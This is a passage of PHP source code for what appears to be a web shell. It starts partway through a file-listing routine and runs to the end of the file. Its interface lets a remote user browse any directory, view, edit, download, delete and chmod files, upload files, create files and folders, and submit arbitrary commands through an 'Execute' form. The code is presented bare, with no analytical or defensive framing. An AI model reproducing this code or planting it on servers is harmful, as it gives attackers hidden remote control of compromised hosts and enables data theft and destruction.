    if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}
    else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}
    if (@is_dir($v)){$row[] = $checkbox;}
    else {$row[] = "<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".$uo."';document.todo.ft.value='edit';document.todo.d.value='".$ud."';document.todo.submit();\">E</a>&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".$uo."';document.todo.ft.value='download';document.todo.d.value='".$ud."';document.todo.submit();\">D</a>&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='delete';document.todo.f.value='".$uo."';document.todo.ft.value='download';document.todo.d.value='".$ud."';document.todo.submit();\">X</a>&nbsp;".$checkbox;}
    if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
    elseif (@is_link($v)) {$tab["links"][] = $row;}
    elseif (@is_dir($v)) {$tab["folders"][] = $row;}
    elseif (@is_file($v)) {$tab["files"][] = $row;}
    $i++;
   }
  }
  //Compiling table
  $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
  echo "<center><b>Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form method=POST name=\"ls_form\"><input type=hidden name=act value=".$dspact."><input type=hidden name=d value=".$d.">";
  foreach($table as $row)
  {
   echo "<tr>\r\n";
   foreach($row as $v) {echo "<td>".$v."</td>\r\n";}
   echo "</tr>\r\n";
  }
  echo "</table><hr size=\"1\" noshade>";
  echo "<select name=act><option value=\"".$act."\">With selected:</option>";
  echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";
  echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";
  echo "</select>&nbsp;<input type=submit value=\"Confirm\"></p>";
  echo "</form>";
 }
}

if ($act == "f")
{
 if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")
 {
  if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='edit';document.todo.c.value='1';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"><u>Create</u></a></center>";}
 }
 else
 {
  $r = @file_get_contents($d.$f);
  echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;".$f." (".view_size(@filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>";
   echo "<hr size=\"1\" noshade>";
 if ($ft == "download")
  {
  }  elseif ($ft == "edit") {
    if (!empty($submit)) {
        if(save_file($d.$f, $edit_text)) {
            echo('<b>Saved!</b>');
        } else {
            echo('<b>Can\'t write to file!</b>');
        }
        $r = $edit_text;
   }
   echo "<form method=\"POST\"><input name='act' type='hidden' value='f'><input name='f' type='hidden' value='".urlencode($f)."'><input name='ft' type='hidden' value='edit'><input name='d' type='hidden' value='".urlencode($d)."'><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".addslashes(substr($d,0,-1))."';document.todo.submit();\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"180\" rows=\"25\">".htmlspecialchars($r)."</textarea></form>";
  }
 }
}
?>
</td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>

<tr><td width="50%" height="1" valign="top"><center><b>Enter</b><form method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="cmd" size="50" value=""><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td><td width="50%" height="1" valign="top"><center><b>Upl</b><form method="POST" name="tod" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="file" name="uploadfile"><input type=submit name=submit value="Upload"><br><?php echo $wdt; ?></form></center></td></tr></TABLE>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>Make Dir</b><form method="POST"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td><td width="50%" height="1" valign="top"><center><b>Make File</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form method="POST"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form method="POST""><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"></p></td></tr></table>
</body></html><?php chdir($lastdir); 
?>
